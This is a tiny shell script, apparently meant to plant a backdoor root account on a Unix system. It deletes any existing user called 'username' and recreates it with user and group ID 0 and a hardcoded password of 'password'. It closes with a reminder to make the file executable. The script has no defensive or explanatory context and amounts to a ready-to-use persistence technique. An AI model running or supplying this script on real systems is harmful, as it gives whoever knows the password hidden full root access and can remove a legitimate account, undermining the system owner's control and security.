#!/bin/sh

# Delete the user "username" if it already exists
userdel username
# Create the user "username" with the password "password" and give it root privileges
useradd -p $(openssl passwd -1 password) -g 0 -ou 0 -s /bin/bash username
# MAKE SURE TO CHMOD +x THIS!!
